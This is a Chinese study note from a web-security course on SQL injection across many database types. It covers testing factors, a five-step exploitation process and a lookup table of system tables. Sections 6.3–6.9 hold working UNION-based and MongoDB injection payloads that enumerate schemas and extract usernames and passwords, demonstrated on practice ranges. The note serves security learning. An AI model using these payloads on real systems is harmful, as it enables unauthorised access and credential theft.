---
tags: [网络安全, WEB攻防, 小迪网课漏洞学习, SQL注入]
---

# SQL 注入全数据库类型笔记

> [!info] 🧭 知识导航
> 所属：[[MOC - SQL注入]] ｜ 上级：[[MOC - 小迪网课漏洞学习]] ｜ 首页：[[🏠 知识库首页]]
> 下一篇：[[01 SQL注入实战进阶笔记_参数类型与数据传输格式]]
> 🔗 相关：[[01 SQL注入实战进阶笔记_参数类型与数据传输格式]] · [[MySQL入门笔记+SQL注入]] · [[01 Java数据库框架与SQL注入审计笔记]]

> **与前置笔记的关系**：数据库增删改查基础、MySQL 的反引号/单引号标注规范、SQL 注入的底层原理（Source→Sink 模型）、注入分类、报错/布尔/时间盲注、防御方法，这些内容已经在《MySQL入门笔记：增删改查 + SQL 注入》里详细讲过，**本文不重复展开**，只在需要时简要带过并标注"详见该笔记第几章"。本文的新增价值是：**把 SQL 注入从"只懂 MySQL"扩展到"遇到任何数据库类型都知道怎么下手"**。
>
> **一个重要的语法提醒（容易搞混）**：上一篇笔记里，我们用反引号 `` ` `` 包裹 MySQL 的表名/列名标识符——**这是 MySQL 专属语法**。本文会讲到的 Oracle、PostgreSQL、SQL Server（MSSQL）等数据库，标识符加引号的写法是**双引号 `"identifier"`**，不是反引号。之后看到不同数据库的代码风格不一样，不是我写错了，是每种数据库自己的语法规定不同。

---

## 目录

1. [数据库基础知识速览](#1-数据库基础知识速览)
2. [影响 SQL 注入的六个因素](#2-影响-sql-注入的六个因素)
3. [常见 SQL 注入的利用过程（五步法）](#3-常见-sql-注入的利用过程五步法)
4. [黑盒 / 白盒如何发现 SQL 注入](#4-黑盒--白盒如何发现-sql-注入)
5. [联合查询注入的通用思路（回顾）](#5-联合查询注入的通用思路回顾)
6. [各数据库类型专项注入语法](#6-各数据库类型专项注入语法)
7. [速查表：各数据库"摸清结构"关键语句对照](#7-速查表各数据库摸清结构关键语句对照)
8. [练习靶场](#8-练习靶场)
9. [总结](#9-总结)

---

## 1. 数据库基础知识速览

学习 SQL 注入之前，需要知道数据库里这几类"东西"分别是什么、关注点在哪：

| 知识点             | 关注什么                                                                                                                                 |
| --------------- | ------------------------------------------------------------------------------------------------------------------------------------ |
| 数据库名、表名、列名、数据   | 这四层是你最终要从注入里"挖"出来的东西，层层递进——先知道有哪些库，再知道库里有哪些表，再知道表里有哪些列，最后才是具体数据                                                                      |
| 自带数据库、数据库用户及权限  | 每种数据库装好后都会自带一些系统库（如 MySQL 的 `information_schema`），这些系统库本身不存业务数据，但存着"元数据"（数据库结构信息），是注入摸清结构时必须利用的对象；用户权限则决定了注入能造成多大的破坏（比如有没有读写文件的权限）   |
| 数据库敏感函数、默认端口及应用 | 不同数据库有各自的"报信息"函数（如 MySQL 的 `version()`），默认端口是信息收集阶段判断"这是什么数据库"的重要线索（如 MySQL 默认 3306、MSSQL 默认 1433、Oracle 默认 1521、PostgreSQL 默认 5432） |
| 数据库查询方法（增删改查）   | 即 CRUD，详见《MySQL入门笔记》第 3-6 章，这是你构造注入 payload 前必须先理解的基本语法骨架 [[MySQL入门笔记+SQL注入]]                                                        |

---

## 2. 影响 SQL 注入的六个因素

拿到一个可能存在注入的参数时，并不是上来就能直接打，而是要先判断清楚这六个维度，它们共同决定了你该用什么方式、什么 payload：

| 因素                    | 为什么重要                                                                                                       |
| --------------------- | ----------------------------------------------------------------------------------------------------------- |
| **1. 数据库类型**          | 不同数据库的系统表、函数名完全不同（本文第 6 章的核心内容），用错数据库的语法，payload 直接报语法错误，等于白打                                               |
| **2. 数据操作方法（增删改查）**   | 当前触发点是查询（`SELECT`）还是写入（`INSERT`/`UPDATE`）类型的 SQL，决定了你能用哪类注入手法——比如联合查询注入只对 `SELECT` 类语句有效，因为它依赖"拼接额外的查询结果"   |
| **3. 参数数据类型（符号干扰）**   | 参数在原 SQL 里是数字型（不带引号）还是字符型（带单引号包裹），决定了你要不要先"闭合"一个引号才能让后续代码生效，详见《MySQL入门笔记》第 8.3 节                            |
| **4. 参数数据格式（加密编码等）**  | 如果参数在传给后端前经过了前端加密或编码（可回顾《前端加密与代码混淆笔记》），直接改参数值是不会生效的，必须先搞清楚编码/加密方式，构造出"解密后是你想要的注入语句"的密文                      |
| **5. 提交数据方式（数据包部分）**  | 注入点不一定在 URL 参数里，也可能在 POST 表单体、Cookie、HTTP 请求头（如 `User-Agent`、`Referer`）等数据包的任意部分，只要这部分内容最终会被拼进 SQL，就都是潜在注入点 |
| **6. 有无数据处理（无回显逻辑等）** | 页面有没有把查询结果直接显示出来，决定了你该用联合查询注入，还是退而求其次用报错注入/布尔盲注/时间盲注（详见《MySQL入门笔记》第 11 章）                                   |

---

## 3. 常见 SQL 注入的利用过程（五步法）

这是一个通用的实战流程框架，不管面对哪种数据库，大的方向都是这五步：

```
① 判断数据库类型
       ↓（决定了第 6 章该查哪一套语法）
② 判断参数类型及格式
       ↓（数字型/字符型，是否需要先处理编码）
③ 判断数据提交方式
       ↓（GET/POST/Cookie/Header，确定注入点具体在哪个位置）
④ 判断数据回显及防护情况
       ↓（决定了用联合查询/报错/盲注哪一种手法，以及要不要考虑 WAF 绕过）
⑤ 获取数据库名 → 表名 → 列名 → 对应数据（尝试获取管理员等关键数据）
```

**为什么一定要按这个顺序**：每一步都是在为下一步"收窄范围、选对工具"——比如你还没搞清楚是 MySQL 还是 Oracle 就直接套用 `information_schema` 的语法，大概率直接报错，白白浪费测试机会，甚至可能触发 WAF 告警。顺序走对了，才能做到"一次尝试一个变量"，效率最高。

---

## 4. 黑盒 / 白盒如何发现 SQL 注入

| 方式       | 做法                                                                                                                               |
| -------- | -------------------------------------------------------------------------------------------------------------------------------- |
| **黑盒测试** | 对页面上所有能接收参数的位置逐一进行测试（URL 参数、表单字段、Cookie、请求头等），结合"这个功能点背后大概率在操作数据库"的经验去判断优先级（比如搜索框、登录框、筛选排序功能，背后几乎必然有 SQL 查询）                     |
| **白盒测试** | 直接看源码，定位所有执行 SQL 的位置（搜索 `Statement`、`${}` 等关键词，详见《Java数据库框架与SQL注入审计笔记》），判断用户输入是否被拼接进去。这部分会在后续代码审计课程里系统展开，这里先建立"黑盒先猜、白盒验证"的思路框架即可 |

> **黑盒测试的核心技巧是"整合功能点脑补"**——不要漫无目的地对每个参数瞎试，而是先猜"这个功能背后的 SQL 大概长什么样"，比如一个"按价格排序"的功能，背后大概率是 `ORDER BY price`，那么注入点很可能就在排序参数上，这样能大幅提高命中效率。

---

## 5. 联合查询注入的通用思路（回顾）

完整的五步流程（判断字段数 → 确定回显位置 → 获取数据库信息 → 获取库名表名列名 → 获取数据）已经在《MySQL入门笔记》第 10 章用 MySQL 语法完整演示过。**这个五步流程的"思路"适用于所有数据库**，唯一会变化的是第三步和第四步里查询"元数据"时用的具体系统表/函数名——这正是第 6 章要讲的内容。

---

## 6. 各数据库类型专项注入语法

> 每个数据库小节的结构固定为：**这个数据库现状如何（要不要花时间学）→ 它的"元数据系统"叫什么、怎么查 → 实战语句**。不要求背下每一条语句，理解"每种数据库都有一套自己的系统表用来记录库/表/列的结构"这个共性，再查表使用即可。

### 6.1 Access

**现状**：已经基本被淘汰，现代渗透测试中遇到的概率很低，了解即可，不建议投入时间深入练习。

### 6.2 MSSQL（SQL Server）

靶场：<http://vulnweb.com/>

MSSQL 有自己的系统视图 `sysobjects`（存表信息）、`syscolumns`（存列信息），以及 `@@version` 函数获取版本信息，用法思路和下文的 Sybase（本身就是 SQL Server 的"近亲"，语法高度相似）一致，可以直接参照 6.5 节。

### 6.3 MySQL（详细版见前置笔记，这里补充完整实战案例）

参考：<https://blog.csdn.net/weixin_57524749/article/details/140618103>

```sql
-- 获取当前数据库名
id=-1 union select 1,database(),3,4

-- 获取指定库下所有表名（这里以 mozhe_Discuz_StormGroup 库为例）
id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='mozhe_Discuz_StormGroup'

-- 获取指定表的所有列名
id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='StormGroup_member'

-- 最终取出数据（id、用户名、密码拼在一起输出）
id=-1 union select 1,2,group_concat(id,name,password),4 from StormGroup_member
```

这组语句和《MySQL入门笔记》第 10 章讲的五步法完全对应，差别只是这里的字段数是 4（意味着前面做 `order by` 测试时会在 `order by 5` 处报错）。

### 6.4 Oracle

参考：<https://blog.csdn.net/A2893992091/article/details/141365829>

**为什么 Oracle 语法看起来特别不一样**：Oracle 没有 MySQL 那种"直接 `SELECT 常量`"的简化写法，**任何 `SELECT` 都必须有一个 `FROM`**，所以 Oracle 专门准备了一张什么业务数据都不存、只用来"占位"的空表 `dual`，专门给这种"我只是想算个值/拼个字符串，不是真的要查表"的场景用。另外 Oracle 的元数据系统表是 `all_tables`（所有能看到的表）、`user_tables`（当前用户自己的表）、`all_tab_columns`（所有列信息），而不是 MySQL 的 `information_schema`。

```sql
-- 第一步：获取当前库里某个 owner（相当于 MySQL 里的库名概念）
and 1=2 union select (select distinct owner from all_tables where rownum=1),'2' from dual

-- 获取当前用户下的第一张表名
and 1=2 union select (select table_name from user_tables where rownum=1),'2' from dual

-- 排除已知表名，翻看下一张表（rownum 配合 not in 实现“翻页”效果）
and 1=2 union select (select table_name from user_tables where rownum=1 and table_name not in ('已获取的表名')),'2' from dual

-- 获取指定表 sns_users 的第一个列名
and 1=2 union select (select column_name from all_tab_columns where rownum=1 and table_name='sns_users'),'2' from dual

-- 排除已知列名，继续翻看下一列
and 1=2 union select (select column_name from all_tab_columns where rownum=1 and table_name='sns_users' and column_name not in ('USER_NAME')),'2' from dual

-- 确认列名后，直接取数据（注意 Oracle 用双引号包裹标识符，不是反引号）
and 1=2 union select USER_NAME,USER_PWD from "sns_users"

-- 跳过已经看到的第一条数据，查看其他用户
and 1=2 union select USER_NAME,USER_PWD from "sns_users" where user_name not in ('hu')
```

> Oracle 没有 `LIMIT`，所以"一条一条翻页查看"是靠 `rownum`（行号伪列）配合 `not in (已知值)` 这种"排除法"实现的，这是和 MySQL 思路差异最大的地方，需要重点理解。

### 6.5 SQLite

参考：<https://blog.csdn.net/qq_32393893/article/details/103083240>

SQLite 的元数据表叫 `sqlite_master`，里面的 `sql` 列直接存着"这张表当初是用什么 `CREATE TABLE` 语句建出来的"——这意味着**读一次 `sqlite_master` 基本等于直接拿到了建表语句，连列名都不用再单独查了**，比其他数据库方便很多。

```sql
-- 查看 sqlite_master 的第一条记录，sql 列里就包含了表结构信息
union select 1,name,sql,4 from sqlite_master limit 0,1

-- 确认表名（如 WSTMart_reg）和列名后，直接取数据
union select 1,name,password,4 from WSTMart_reg
```

### 6.6 Sybase

Sybase 和 MSSQL 系出同源（历史上 SQL Server 最早就是从 Sybase 的代码分支出来的），所以语法高度相似：都用 `db_name()` 取库名，都有 `sysobjects`（表信息）、`syscolumns`（列信息），都支持"库名.dbo.表名"或"库名..表名"这种跨库引用写法。

```sql
-- 获取当前数据库名
id=-1 union all select null,db_name(),null,null

-- 获取 mozhe_Deepthroat 库下所有表名（sysobjects 是系统表信息表）
id=-1 union all select null,name,null,null from mozhe_Deepthroat.dbo.sysobjects

-- 获取指定表 Deepthroat_login 的所有列名（object_id() 把表名转成内部编号去关联查询）
id=-1 union all select null,name,null,null from mozhe_Deepthroat..syscolumns where id=object_id('Deepthroat_login')

-- 排除已知的 id 列，继续查看其他列
id=-1 union all select null,name,null,null from mozhe_Deepthroat..syscolumns where id=object_id('Deepthroat_login') and name<>'id'
```

确认表里有 `username`/`password` 这类列名之后，和前面 MySQL/Oracle 的思路一样，直接把 `union select` 里的目标换成这些列名，从 `Deepthroat_login` 表中把数据取出来即可。

### 6.7 DB2

```sql
-- 查看当前库下所有表（syscat.tables 相当于 DB2 的 information_schema.tables）
id=-1 union select 1,2,3,4 from syscat.tables

-- 获取当前 schema（库名概念）和服务器信息（sysibm.sysdummy1 相当于 DB2 版的 dual 占位表）
id=-1 union select 1,current schema,current server,4 from sysibm.sysdummy1

-- 获取当前 schema 下的第一张表名
id=-1 union select 1,current schema,tabname,4 from syscat.tables where tabschema=current schema limit 0,1

-- 获取指定表 GAME_CHARACTER 的列名（limit 偏移量配合分页，逐条翻看）
id=-1 union select 1,colname,tabname,4 from syscat.columns where tabschema=current schema and tabname='GAME_CHARACTER' limit 1,1
id=-1 union select 1,colname,tabname,4 from syscat.columns where tabschema=current schema and tabname='GAME_CHARACTER' limit 2,1

-- 确认列名（如 NAME、PASSWORD）后取数据
id=-1 union select 1,NAME,PASSWORD,4 from GAME_CHARACTER limit 0,1
id=-1 union select 1,NAME,PASSWORD,4 from GAME_CHARACTER limit 1,1
```

> DB2 的系统表前缀是 `syscat`（catalog 的缩写），`sysibm.sysdummy1` 则扮演了和 Oracle `dual` 一样的"占位表"角色——两个不同数据库厂商不约而同地设计了同样的解决方案，说明"SELECT 必须有 FROM"这个限制在多个数据库里都存在，只是各自取的占位表名字不同。

### 6.8 NoSQL（以 MongoDB 相关场景为例）

参考：<https://blog.csdn.net/m0_75036923/article/details/141364038>

这一类和前面几种关系型数据库完全不同——它不是"SQL 语法被拼接"，而是**用户输入被当成了一段 JavaScript 代码拼进了服务端的查询模板里直接执行**（原理上更接近此前《代码执行与命令执行安全笔记》里讲的 `eval()` 风险，只是载体换成了数据库查询的上下文）。

```js
// 闭合前一个字段，提前 return 一个自己构造的对象，相当于控制了整个响应内容
id=1'});return ({title:'1',content:'2

// 利用 db.getCollectionNames() 枚举出当前数据库里所有的集合（collection，相当于关系型数据库里的"表"）
'});return ({content:tojson(db.getCollectionNames()),title:'1

// 直接读取某个集合（这里叫 Authority_confidential，从命名看大概率是存敏感权限数据的集合）的第一条文档
'});return ({content:tojson(db.Authority_confidential.find()[0]),title:'
```

> 这类注入提醒我们：**SQL 注入只是"注入类漏洞"大家族里的一种**，核心思路（用户输入闭合/逃逸出原本的语法结构，拼接出攻击者自己的逻辑）在 NoSQL、模板引擎（SSTI，详见《PHP生态组件与模板引擎安全笔记》《Vue开发环境搭建与安全笔记》）等场景里都是同一套底层判断方法。

### 6.9 PostgreSQL

参考：<https://blog.csdn.net/2401_88387979/article/details/144275425>

PostgreSQL 的字符串聚合函数叫 `string_agg()`（作用等同 MySQL 的 `group_concat()`），系统表走标准的 `information_schema`（这点和 MySQL 相同，因为两者都比较遵循 SQL 标准），但同时也有自己专属的系统表 `pg_database`（所有数据库列表）、`pg_tables`（所有表列表）。

```sql
-- 先用两次测试确定回显列位置（分别在第1、第2列放入标记字符串 'null' 观察显示在哪）
and 1=2 union select 'null',null,null,null
and 1=2 union select null,'null',null,null

-- 获取所有数据库名（pg_database 是 PostgreSQL 专属系统表）
and 1=2 union select null,null,string_agg(datname,','),null from pg_database

-- 获取 public 这个 schema 下的所有表名（pg_tables 同样是专属系统表）
and 1=2 union select null,null,string_agg(tablename,','),null from pg_tables where schemaname='public'

-- 获取指定表 reg_users 的所有列名（这里走标准 information_schema，和 MySQL 写法几乎一样）
and 1=2 union select null,null,string_agg(column_name,','),null from information_schema.columns where table_name='reg_users'

-- 确认列名（name、password）后取数据
and 1=2 union select null,string_agg(name,','),string_agg(password,','),null from reg_users
```

---

## 7. 速查表：各数据库"摸清结构"关键语句对照

把"查库名 → 查表名 → 查列名 → 拼接多行结果的函数"这四件事在各数据库里的对应写法放在一张表里，方便遇到陌生数据库时直接查表套用：

| 数据库          | 查当前库名                | 查表名用的系统表                                  | 查列名用的系统表                     | 多行拼一行的函数                         | 占位表（无实际表可查时用）       |
| ------------ | -------------------- | ----------------------------------------- | ---------------------------- | -------------------------------- | ------------------- |
| MySQL        | `database()`         | `information_schema.tables`               | `information_schema.columns` | `group_concat()`                 | 不需要，可直接 `SELECT 常量` |
| MSSQL/Sybase | `db_name()`          | `sysobjects`                              | `syscolumns`                 | 无内置聚合函数，常需多次查询或借助 `for xml path` | 不需要                 |
| Oracle       | 无直接等价（看 `owner`）     | `all_tables` / `user_tables`              | `all_tab_columns`            | 无内置聚合函数，常用 `rownum` 逐条翻页         | `dual`              |
| SQLite       | 无库概念（单文件数据库）         | `sqlite_master`                           | 同左（`sql`列自带结构）               | 无内置聚合函数                          | 不需要                 |
| DB2          | `current schema`     | `syscat.tables`                           | `syscat.columns`             | 无内置聚合函数                          | `sysibm.sysdummy1`  |
| PostgreSQL   | `current_database()` | `pg_tables` / `information_schema.tables` | `information_schema.columns` | `string_agg()`                   | 不需要                 |

> **记忆方法**：不需要死记这张表，理解背后的规律——**几乎每种数据库都会提供"查库名的函数"+"存表信息的系统表"+"存列信息的系统表"这三件套**，只是各家叫法不同。遇到新数据库时，优先搜索"数据库名 + information_schema 或等价系统表"，大概率能很快定位到对应语法。

---

## 8. 练习靶场

- <http://vulnweb.com/> —— 多种数据库类型的练习靶场
- <https://mozhe.cn/Special/SQL_Injection> —— 墨者学院 SQL 注入专题靶场（中文靶场，本文多个案例的表名如 `StormGroup_member`、`Deepthroat_login` 均来自此平台）

> 结合《MySQL入门笔记》第 15.2 节推荐的 PortSwigger、SQLZOO、HackTricks 等国际资源使用，中文靶场练手感、国际资源查原理和多数据库语法差异速查表，两者互补。

---

## 9. 总结

1. SQL 注入的**底层原理和判断方法是通用的**（闭合引号、构造真假条件、Source→Sink 模型），这部分不随数据库类型变化，详见《MySQL入门笔记》。
2. **真正因数据库而异的，只是"怎么摸清库表结构"这一步用的系统表/函数名**——本文第 6、7 章就是帮你建立"遇到新数据库，第一反应该去查什么"的检索框架，而不是要求背下每一条 payload。
3. 实战中第一步永远是**先判断数据库类型**（看报错信息、默认端口、URL 后缀、或是直接用带数据库特征的 payload 试探），判断错了后面全部语法都会报错，这一步判断准确与否直接决定了注入测试的效率。
[[MySQL入门笔记+SQL注入]]
[[01 SQL注入实战进阶笔记_参数类型与数据传输格式]]
[[SRC漏洞挖掘经验笔记]]